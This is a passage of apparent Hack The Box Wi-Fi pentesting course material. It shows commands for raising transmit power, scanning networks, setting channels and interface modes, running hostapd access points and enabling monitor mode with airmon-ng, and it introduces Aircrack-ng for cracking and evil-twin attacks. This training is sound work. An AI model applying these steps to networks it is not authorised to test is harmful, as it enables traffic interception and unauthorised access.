+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo ifconfig wlan0 down
+</code></pre>
+<p>Then, we can set the desired txpower for our interface with the <code>iwconfig</code> utility.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo iwconfig wlan0 txpower <span class="hljs-number">30</span>
+</code></pre>
+<p>After that, we would need to bring our interface back up.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo ifconfig wlan0 up
+</code></pre>
+<p>Next, we can check the settings again by using the <code>iwconfig</code> utility.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">ESSID:</span>off/any  
+<span class="hljs-symbol">          Mode:</span>Managed  Access <span class="hljs-string">Point:</span> Not-Associated   Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<p>The default TX power of a wireless interface is typically set to 20 dBm, but it can be increased to 30 dBm using certain methods. However, caution should be exercised, as this adjustment may be illegal in some countries, and users should proceed at their own risk. Additionally, some wireless models may not support these settings, or the wireless chip might technically be capable of transmitting at higher power, but the device manufacturer may not have equipped the device with the necessary heat sink to safely handle the increased output.</p>
+<p>The TX power of the wireless interface can be modified using the previously mentioned command. However, in certain instances, this change may not take effect, which could indicate that the kernel has been patched to prevent such modifications.</p>
+<hr>
+<p><strong>Checking Driver Capabilities for our Interface</strong></p>
+<p>As mentioned, one of the most important things for our interface, is its capabilities to perform different actions during wi-fi penetration testing. If our interface does not support something, in most cases we simply will not be able to perform that action, unless we acquire another interface. Luckily, we can check on these capabilities via the command line.</p>
+<p>The command that we can use to find out this information is the iw list command.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ iw <span class="hljs-keyword">list</span>
+
+Wiphy phy5
+    wiphy <span class="hljs-built_in">index</span>: <span class="hljs-number">5</span>
+    <span class="hljs-built_in">max</span> # scan SSID<span class="hljs-variable">s:</span> <span class="hljs-number">4</span>
+    <span class="hljs-built_in">max</span> scan IEs length: <span class="hljs-number">2186</span> bytes
+    <span class="hljs-built_in">max</span> # sched scan SSID<span class="hljs-variable">s:</span> <span class="hljs-number">0</span>
+    <span class="hljs-built_in">max</span> # <span class="hljs-keyword">match</span> <span class="hljs-keyword">set</span><span class="hljs-variable">s:</span> <span class="hljs-number">0</span>
+    <span class="hljs-built_in">max</span> # scan plan<span class="hljs-variable">s:</span> <span class="hljs-number">1</span>
+    <span class="hljs-built_in">max</span> scan plan interva<span class="hljs-variable">l:</span> -<span class="hljs-number">1</span>
+    <span class="hljs-built_in">max</span> scan plan iteration<span class="hljs-variable">s:</span> <span class="hljs-number">0</span>
+    Retry short limi<span class="hljs-variable">t:</span> <span class="hljs-number">7</span>
+    Retry long limi<span class="hljs-variable">t:</span> <span class="hljs-number">4</span>
+    Coverage clas<span class="hljs-variable">s:</span> <span class="hljs-number">0</span> (<span class="hljs-keyword">up</span> <span class="hljs-keyword">to</span> <span class="hljs-number">0</span><span class="hljs-keyword">m</span>)
+    Device supports RSN-IBSS.
+    Device supports AP-side <span class="hljs-keyword">u</span>-APSD.
+    Device supports T-DLS.
+    Supported Cipher<span class="hljs-variable">s:</span>
+            * WEP40 (<span class="hljs-number">00</span>-<span class="hljs-number">0</span><span class="hljs-keyword">f</span>-ac:<span class="hljs-number">1</span>)
+            * WEP104 (<span class="hljs-number">00</span>-<span class="hljs-number">0</span><span class="hljs-keyword">f</span>-ac:<span class="hljs-number">5</span>)
+            <span class="hljs-symbol">&lt;SNIP&gt;</span>
+            * GMAC-<span class="hljs-number">256</span> (<span class="hljs-number">00</span>-<span class="hljs-number">0</span><span class="hljs-keyword">f</span>-ac:<span class="hljs-number">12</span>)
+    Available Antenna<span class="hljs-variable">s:</span> TX <span class="hljs-number">0</span> RX <span class="hljs-number">0</span>
+    Supported interface <span class="hljs-keyword">mode</span><span class="hljs-variable">s:</span>
+             * IBSS
+             * managed
+             * AP
+             * AP/VLAN
+             * monitor
+             * mesh point
+             * P2P-client
+             * P2P-GO
+             * P2P-device
+    Band <span class="hljs-number">1</span>:
+        <span class="hljs-symbol">&lt;SNIP&gt;</span>
+        Frequencie<span class="hljs-variable">s:</span>
+                * <span class="hljs-number">2412</span> MHz [<span class="hljs-number">1</span>] (<span class="hljs-number">20.0</span> dBm)
+                * <span class="hljs-number">2417</span> MHz [<span class="hljs-number">2</span>] (<span class="hljs-number">20.0</span> dBm)
+                <span class="hljs-symbol">&lt;SNIP&gt;</span>
+                * <span class="hljs-number">2472</span> MHz [<span class="hljs-number">13</span>] (disabled)
+                * <span class="hljs-number">2484</span> MHz [<span class="hljs-number">14</span>] (disabled)
+    Band <span class="hljs-number">2</span>:
+        <span class="hljs-symbol">&lt;SNIP&gt;</span>
+        Frequencie<span class="hljs-variable">s:</span>
+                * <span class="hljs-number">5180</span> MHz [<span class="hljs-number">36</span>] (<span class="hljs-number">20.0</span> dBm)
+                <span class="hljs-symbol">&lt;SNIP&gt;</span>
+                * <span class="hljs-number">5260</span> MHz [<span class="hljs-number">52</span>] (<span class="hljs-number">20.0</span> dBm) (radar detection)
+                <span class="hljs-symbol">&lt;SNIP&gt;</span>
+                * <span class="hljs-number">5700</span> MHz [<span class="hljs-number">140</span>] (<span class="hljs-number">20.0</span> dBm) (radar detection)
+                <span class="hljs-symbol">&lt;SNIP&gt;</span>
+                * <span class="hljs-number">5825</span> MHz [<span class="hljs-number">165</span>] (<span class="hljs-number">20.0</span> dBm)
+                * <span class="hljs-number">5845</span> MHz [<span class="hljs-number">169</span>] (disabled)
+    <span class="hljs-symbol">&lt;SNIP&gt;</span>
+        Device supports TX status socket option.
+        Device supports HT-IBSS.
+        Device supports SAE with AUTHENTICATE <span class="hljs-keyword">command</span>
+        Device supports low priority scan.
+    <span class="hljs-symbol">&lt;SNIP&gt;</span>
+</code></pre>
+<p>Of course, this output can be lengthy, but all the information in here is pertinent to our testing efforts. From the above example, we know that this interface supports the following.</p>
+<ol>
+<li><code>Almost all pertinent regular ciphers</code></li>
+<li><code>Both 2.4Ghz and 5Ghz bands</code></li>
+<li><code>Mesh networks and IBSS capabilities</code></li>
+<li><code>P2P peering</code></li>
+<li><code>SAE aka WPA3 authentication</code></li>
+</ol>
+<p>As such, it can be very important for us to check on our interface's capabilities. Suppose we were testing a WPA3 network, and we came to find out that our interface's driver did not support WPA3, we might be left scratching our head.</p>
+<hr>
+<p><strong>Scanning Available WiFi Networks</strong></p>
+<p>To efficiently scan for available WiFi networks, we can use the <code>iwlist</code> command along with the specific interface name. Given the potentially extensive output of this command, it is beneficial to filter the results to show only the most relevant information. This can be achieved by piping the output through grep to include only lines containing <code>Cell</code>, <code>Quality</code>, <code>ESSID</code>, or <code>IEEE</code>.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwlist wlan0 scan |  grep <span class="hljs-string">'Cell\|Quality\|ESSID\|IEEE'</span>
+
+          Cell <span class="hljs-number">01</span> - <span class="hljs-string">Address:</span> <span class="hljs-string">f0:</span><span class="hljs-number">28</span>:<span class="hljs-string">c8:</span><span class="hljs-string">d9:</span><span class="hljs-number">9</span><span class="hljs-string">c:</span><span class="hljs-number">6</span>e
+                    Quality=<span class="hljs-number">61</span>/<span class="hljs-number">70</span>  Signal level=<span class="hljs-number">-49</span> dBm  
+<span class="hljs-symbol">                    ESSID:</span><span class="hljs-string">"HTB-Wireless"</span>
+<span class="hljs-symbol">                    IE:</span> IEEE <span class="hljs-number">802.11</span>i/WPA2 Version <span class="hljs-number">1</span>
+          Cell <span class="hljs-number">02</span> - <span class="hljs-string">Address:</span> <span class="hljs-number">3</span><span class="hljs-string">a:</span><span class="hljs-string">c4:</span><span class="hljs-number">6</span><span class="hljs-string">e:</span><span class="hljs-number">40</span>:<span class="hljs-number">09</span>:<span class="hljs-number">76</span>
+                    Quality=<span class="hljs-number">70</span>/<span class="hljs-number">70</span>  Signal level=<span class="hljs-number">-30</span> dBm  
+<span class="hljs-symbol">                    ESSID:</span><span class="hljs-string">"CyberCorp"</span>
+<span class="hljs-symbol">                    IE:</span> IEEE <span class="hljs-number">802.11</span>i/WPA2 Version <span class="hljs-number">1</span>
+          Cell <span class="hljs-number">03</span> - <span class="hljs-string">Address:</span> <span class="hljs-number">48</span>:<span class="hljs-number">32</span>:<span class="hljs-string">c7:</span><span class="hljs-string">a0:</span><span class="hljs-string">aa:</span><span class="hljs-number">6</span>d
+                    Quality=<span class="hljs-number">70</span>/<span class="hljs-number">70</span>  Signal level=<span class="hljs-number">-30</span> dBm  
+<span class="hljs-symbol">                    ESSID:</span><span class="hljs-string">"HackTheBox"</span>
+<span class="hljs-symbol">                    IE:</span> IEEE <span class="hljs-number">802.11</span>i/WPA2 Version <span class="hljs-number">1</span>
+</code></pre>
+<p>From the refined output of the <code>iwlist</code> command, we can identify that there are three available WiFi networks. This filtered information focuses on the critical details such as the network cells, signal quality, ESSID, and IEEE specifications, making it straightforward to analyze the available networks.</p>
+<hr>
+<p><strong>Changing Channel &amp; Frequency of Interface</strong></p>
+<p>We can use the following command to see all available channels for the wireless interface:</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ iwlist wlan0 channel
+
+wlan0     <span class="hljs-number">32</span> channels in total; <span class="hljs-selector-tag">available</span> <span class="hljs-selector-tag">frequencies</span> :
+          <span class="hljs-selector-tag">Channel</span> 01 : 2<span class="hljs-selector-class">.412</span> <span class="hljs-selector-tag">GHz</span>
+          <span class="hljs-selector-tag">Channel</span> 02 : 2<span class="hljs-selector-class">.417</span> <span class="hljs-selector-tag">GHz</span>
+          <span class="hljs-selector-tag">Channel</span> 03 : 2<span class="hljs-selector-class">.422</span> <span class="hljs-selector-tag">GHz</span>
+          <span class="hljs-selector-tag">Channel</span> 04 : 2<span class="hljs-selector-class">.427</span> <span class="hljs-selector-tag">GHz</span>
+          &lt;<span class="hljs-selector-tag">SNIP</span>&gt;
+          <span class="hljs-selector-tag">Channel</span> 140 : 5<span class="hljs-selector-class">.7</span> <span class="hljs-selector-tag">GHz</span>
+          <span class="hljs-selector-tag">Channel</span> 149 : 5<span class="hljs-selector-class">.745</span> <span class="hljs-selector-tag">GHz</span>
+          <span class="hljs-selector-tag">Channel</span> 153 : 5<span class="hljs-selector-class">.765</span> <span class="hljs-selector-tag">GHz</span>
+</code></pre>
+<p>First, we need to disable the wireless interface which ensures that the interface is not in use and can be safely reconfigured. Then we can set the desired <code>channel</code> using the <code>iwconfig</code> command and finally, re-enable the wireless interface.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo ifconfig wlan0 down
+root<span class="hljs-meta">@htb</span>[/htb]$ sudo iwconfig wlan0 channel <span class="hljs-number">64</span>
+root<span class="hljs-meta">@htb</span>[/htb]$ sudo ifconfig wlan0 up
+root<span class="hljs-meta">@htb</span>[/htb]$ iwlist wlan0 channel
+
+wlan0     <span class="hljs-number">32</span> channels <span class="hljs-keyword">in</span> total; available frequencies :
+          <span class="hljs-built_in">Channel</span> <span class="hljs-number">01</span> : <span class="hljs-number">2.412</span> GHz
+          <span class="hljs-built_in">Channel</span> <span class="hljs-number">02</span> : <span class="hljs-number">2.417</span> GHz
+          <span class="hljs-built_in">Channel</span> <span class="hljs-number">03</span> : <span class="hljs-number">2.422</span> GHz
+          <span class="hljs-built_in">Channel</span> <span class="hljs-number">04</span> : <span class="hljs-number">2.427</span> GHz
+          &lt;SNIP&gt;
+          <span class="hljs-built_in">Channel</span> <span class="hljs-number">140</span> : <span class="hljs-number">5.7</span> GHz
+          <span class="hljs-built_in">Channel</span> <span class="hljs-number">149</span> : <span class="hljs-number">5.745</span> GHz
+          <span class="hljs-built_in">Channel</span> <span class="hljs-number">153</span> : <span class="hljs-number">5.765</span> GHz
+          Current Frequency:<span class="hljs-number">5.32</span> GHz (<span class="hljs-built_in">Channel</span> <span class="hljs-number">64</span>)
+</code></pre>
+<p>As demonstrated in the above output, <code>Channel 64</code> operates at a frequency of <code>5.32 GHz</code>. By following these steps, we can effectively change the channel of the wireless interface to optimize performance and reduce interference.</p>
+<p>If we prefer to change the frequency directly rather than adjusting the channel, we have the option to do so as well.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwlist wlan0 frequency | grep Current
+
+          Current Frequency:5.32 GHz (Channel 64)
+</code></pre>
+<p>To change the frequency, we first need to disable the wireless interface, which ensures that the interface is not in use and can be safely reconfigured. Then, we can set the desired frequency using the iwconfig command and finally, re-enable the wireless interface.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo ifconfig wlan0 down
+root@htb<span class="hljs-string">[/htb]</span>$ sudo iwconfig wlan0 freq <span class="hljs-string">"5.52G"</span>
+root@htb<span class="hljs-string">[/htb]</span>$ sudo ifconfig wlan0 up
+</code></pre>
+<p>We can now verify the current frequency, and this time, we can see that the frequency has been successfully changed to <code>5.52 GHz</code>. This change automatically adjusted the channel to the appropriate <code>channel 104</code>.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwlist wlan0 frequency | grep Current
+
+          Current Frequency:5.52 GHz (Channel 104)
+</code></pre>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In this section, we explored how to choose the right interface, change the region settings for our interface, set interface strength, check the drivers, and scan for available WiFi networks. With these foundational steps covered, we are now prepared to delve into the next topic.</p>
+<p>In the next section, we will delve into the different modes of a wireless interface. We will examine how each mode operates and its specific applications. Understanding these modes will help us utilize wireless interfaces more effectively for diverse purposes, whether it be for routine connectivity, network troubleshooting, or specialized tasks.</p>
+<hr>
+<h2 id="interface-modes">Interface Modes</h2>
+<hr>
+<p>There are many more pertinent modes we need to know for our wireless interfaces when we conduct wi-fi penetration testing. After all, each mode is responsible for different capabilities and roles when it comes down to the hierarchy of wi-fi communications. In this section, we will explore each of these separate modes, what they do, and how we can test our interface for their capabilities.</p>
+<hr>
+<p><strong>Managed Mode</strong></p>
+<p>Managed mode is when we want our interface to act as a client or a station. In other words, this mode allows us to authenticate and associate to an access point, basic service set, and others. In this mode, our card will actively search for nearby networks (APs) to which we can establish a connection.</p>
+<p>Pretty much in most cases, our interface will default to this mode, but suppose we want to set our interface to this mode. This could be helpful after setting our interface into monitor mode. We would run the following command.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo ifconfig wlan0 down
+root@htb<span class="hljs-string">[/htb]</span>$ sudo iwconfig wlan0 mode managed
+</code></pre>
+<p>Then, to connect to a network, we could utilize the following command.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo iwconfig wlan0 essid HTB-Wifi
+</code></pre>
+<p>Then, to check our interface, we can utilize the <code>iwconfig</code> utility.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo iwconfig
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">ESSID:</span><span class="hljs-string">"HTB-Wifi"</span>  
+<span class="hljs-symbol">          Mode:</span>Managed  Access <span class="hljs-string">Point:</span> Not-Associated   Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<hr>
+<p><strong>Ad-hoc Mode</strong></p>
+<p>Secondarily, we could act in a decentralized approach. This is where ad-hoc mode comes into play. Essentially this mode is peer to peer and allows wireless interfaces to communicate directly to one another. This mode is commonly found in most residential mesh systems for their backhaul bands. That is their band that is utilized for AP-to-AP communications and range extension. However, it is important to note, that this mode is not extender mode, as in most cases that is actually two interfaces bridged together.</p>
+<p>To set our interface into this mode, we would run the following commands.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo iwconfig wlan0 mode ad-hoc
+root@htb<span class="hljs-string">[/htb]</span>$ sudo iwconfig wlan0 essid HTB-Mesh
+</code></pre>
+<p>Then, once again, we could check our interface with the <code>iwconfig</code> command.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo iwconfig
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">ESSID:</span><span class="hljs-string">"HTB-Mesh"</span>  
+<span class="hljs-symbol">          Mode:</span>Ad-Hoc  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.412</span> GHz  <span class="hljs-string">Cell:</span> Not-Associated   
+          Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<hr>
+<p><strong>Master Mode</strong></p>
+<p>On the flip side of managed mode is master mode (access point/router mode). However, we cannot simply set this with the <code>iwconfig</code> utility. Rather, we need what is referred to as a management daemon. This management daemon is responsible for responding to stations or clients connecting to our network. Commonly, in wi-fi penetration testing, we would utilize hostapd for this task. As such, we would first want to create a sample configuration.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ nano open.conf
+
+interface=wlan0
+driver=nl80211
+ssid=HTB-Hello-World
+channel=2
+hw_mode=g
+</code></pre>
+<p>This configuration would simply bring up an open network with the name HTB-Hello-World. With this network configuration, we could bring it up with the following command.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo hostapd open.conf
+
+<span class="hljs-symbol">wlan0:</span> interface state UNINITIALIZED-&gt;ENABLED
+<span class="hljs-symbol">wlan0:</span> AP-ENABLED 
+<span class="hljs-symbol">wlan0:</span> STA <span class="hljs-number">2</span>c:<span class="hljs-number">6</span>d:c1:af:eb:<span class="hljs-number">91</span> IEEE <span class="hljs-number">802.11</span>: authenticated
+<span class="hljs-symbol">wlan0:</span> STA <span class="hljs-number">2</span>c:<span class="hljs-number">6</span>d:c1:af:eb:<span class="hljs-number">91</span> IEEE <span class="hljs-number">802.11</span>: associated (aid <span class="hljs-number">1</span>)
+<span class="hljs-symbol">wlan0:</span> AP-STA-CONNECTED <span class="hljs-number">2</span>c:<span class="hljs-number">6</span>d:c1:af:eb:<span class="hljs-number">91</span>
+<span class="hljs-symbol">wlan0:</span> STA <span class="hljs-number">2</span>c:<span class="hljs-number">6</span>d:c1:af:eb:<span class="hljs-number">91</span> RADIUS: starting accounting session D249D3336F052567
+</code></pre>
+<p>In the above example, hostapd brings our AP up, then we connect another device to our network, and we should notice the connection messages. This would indicate the successful operation of the master mode.</p>
+<hr>
+<p><strong>Mesh Mode</strong></p>
+<p>Mesh mode is an interesting one in which we can set our interface to join a self-configuring and routing network. This mode is commonly used for business applications where there is a need for large coverage across a physical space. This mode turns our interface into a mesh point. We can provide additional configuration to make it functional, but generally speaking, we can see if it is possible by whether or not we are greeted with errors after running the following commands.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-symbol">$</span> sudo iw dev wlan0 <span class="hljs-keyword">set</span> type <span class="hljs-comment">mesh</span>
+</code></pre>
+<p>Then we can check our interface once again with the <code>iwconfig</code> utility.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo iwconfig
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Auto  Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<hr>
+<p><strong>Monitor Mode</strong></p>
+<p>Monitor mode, also known as promiscuous mode, is a specialized operating mode for wireless network interfaces. In this mode, the network interface can capture all wireless traffic within its range, regardless of the intended recipient. Unlike normal operation, where the interface only captures packets addressed to it or broadcasted, monitor mode enables comprehensive network monitoring and analysis.</p>
+<p>Enabling monitor mode typically requires administrative privileges and may vary depending on the operating system and wireless chipset used. Once enabled, monitor mode provides a powerful tool for understanding and managing wireless networks.</p>
+<p>First we would need to bring our interface down to avoid a device or resource busy error.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo ifconfig wlan0 down
+</code></pre>
+<p>Then we could set our interface's mode with iw {interface name} set {mode}</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo iw wlan0 set<span class="hljs-built_in"> monitor </span>control
+</code></pre>
+<p>Then we can bring our interface back up.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo ifconfig wlan0 up
+</code></pre>
+<p>Finally, to ensure that our interface is in monitor mode, we can utilize the <code>iwconfig</code> utility.</p>
+<p>  Interface Modes</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Monitor  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.457</span> GHz  Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<p>Overall, it is important to make sure our interface supports whatever mode is pertinent to our testing efforts. If we are attempting to exploit WEP, WPA, WPA2, WPA3, and all enterprise variants, we are likely sufficient with just monitor mode and packet injection capabilities. However, suppose we were trying to achieve different actions we might consider the following capabilities.</p>
+<ol>
+<li><code>Employing a Rogue AP or Evil-Twin Attack:</code> - We would want our interface to support master mode with a management daemon like hostapd, hostapd-mana, hostapd-wpe, airbase-ng, and others.</li>
+<li><code>Backhaul and Mesh or Mesh-Type system exploitation:</code> - We would want to make sure our interface supports ad-hoc and mesh modes accordingly. For this kind of exploitation we are normally sufficient with monitor mode and packet injection, but the extra capabilities can allow us to perform node impersonation among others.</li>
+</ol>
+<p>In the next section, we will dive into the essentials of Aircrack-ng, a powerful suite of tools designed for wireless network security assessments. We will cover the core functionalities of Aircrack-ng, including how to use it for capturing packets, analyzing network traffic, and cracking WEP and WPA/WPA2 encryption keys. This exploration will provide you with a solid foundation for using Aircrack-ng tools in your own security evaluations and network assessments.</p>
+<hr>
+<h2 id="introduction-to-aircrack-ng">Introduction to Aircrack-ng</h2>
+<hr>
+<p><a href="https://github.com/aircrack-ng/aircrack-ng">Aircrack-ng</a> comprises a comprehensive suite of tools designed for the evaluation of WiFi network security. Prior to initiating any endeavors to analyze or exploit wireless networks, a foundational understanding of the functionalities inherent within these tools is imperative.</p>
+<p>Aircrack-ng focuses on different areas of WiFi security:</p>
+<ul>
+<li><code>Monitoring</code>: Packet capture and export of data to text files for further processing by third party tools.</li>
+<li><code>Attacking</code>: Replay attacks, deauthentication, fake access points and others via packet injection.</li>
+<li><code>Testing</code>: Checking WiFi cards and driver capabilities (capture and injection).</li>
+<li><code>Cracking</code>: WEP and WPA PSK (WPA 1 and 2).</li>
+</ul>
+<p>All tools within Aircrack-ng operate through command-line interfaces, facilitating extensive scripting capabilities. This attribute has been leveraged by numerous graphical user interfaces (GUIs). Aircrack-ng predominantly functions on Linux platforms but extends compatibility to Windows, macOS, FreeBSD, OpenBSD, NetBSD, Solaris, and even eComStation 2.</p>
+<p>The Aircrack-ng suite encompasses over 20 tools tailored for auditing Wi-Fi networks. We'll concentrate on the six most frequently utilized and essential tools within the suite. These tools are indispensable for various Wi-Fi security auditing tasks and are commonly sought after by users seeking comprehensive network assessment and protection.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Tool</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Airmon-ng</code></td>
+<td>Airmon-ng can enable and disable monitor mode on wireless interfaces.</td>
+</tr>
+<tr>
+<td><code>Airodump-ng</code></td>
+<td>Airodump-ng can capture raw 802.11 frames.</td>
+</tr>
+<tr>
+<td><code>Airgraph-ng</code></td>
+<td>Airgraph-ng can be used to create graphs of wireless networks using the CSV files generated by Airodump-ng.</td>
+</tr>
+<tr>
+<td><code>Aireplay-ng</code></td>
+<td>Aireplay-ng can generate wireless traffic.</td>
+</tr>
+<tr>
+<td><code>Airdecap-ng</code></td>
+<td>Airdecap-ng can decrypt WEP, WPA PSK, or WPA2 PSK capture files.</td>
+</tr>
+<tr>
+<td><code>Aircrack-ng</code></td>
+<td>Aircrack-ng can crack WEP and WPA/WPA2 networks that use pre-shared keys or PMKID.</td>
+</tr>
+</tbody>
+</table>
+<p>In the upcoming sections, we will go through each of these tools in detail.</p>
+<hr>
+<h2 id="airmon-ng">Airmon-ng</h2>
+<hr>
+<p>Monitor mode is a specialized mode for wireless network interfaces, enabling them to capture all traffic within a WiFi range. Unlike managed mode, where an interface only processes frames addressed to it, monitor mode allows the interface to capture every packet of data it detects, regardless of its intended recipient. This capability is invaluable for network analysis, troubleshooting, and security assessments, as it provides a comprehensive view of the network's activity. By enabling monitor mode, users can intercept and analyze packets, detect unauthorized devices, identify network vulnerabilities, and gather comprehensive data on wireless networks. This mode provides a deeper level of insight into the wireless environment, facilitating more effective troubleshooting, security assessments, and performance evaluations.</p>
+<hr>
+<h4 id="starting-monitor-mode">Starting monitor mode</h4>
+<p>Airmon-ng can be used to enable monitor mode on wireless interfaces. It may also be used to kill network managers, or go back from monitor mode to managed mode. Entering the <code>airmon-ng</code> command without parameters will show the wireless interface name, driver and chipset.</p>
+<p>  Airmon-ng</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo airmon-ng
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+</code></pre>
+<p>We can set the wlan0 interface into monitor mode using the command <code>airmon-ng start wlan0</code>.</p>
+<p>  Airmon-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng start wlan0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+    PID Name
+    559 NetworkManager
+    798 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211<span class="hljs-built_in"> monitor </span>mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+</code></pre>
+<p>We could test to see if our interface is in monitor mode with the iwconfig utility.</p>
+<p>  Airmon-ng</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0mon  IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Monitor  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.457</span> GHz  Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<p>From the above output, it can be observed that the interface has been successfully set to monitor mode. The new name of the interface is now wlan0mon instead of wlan0, indicating that it is operating in monitor mode.</p>
+<hr>
+<h4 id="checking-for-interfering-processes">Checking for interfering processes</h4>
+<p>When putting a card into monitor mode, it will automatically check for interfering processes. It can also be done manually by running the following command:</p>
+<p>  Airmon-ng</p>
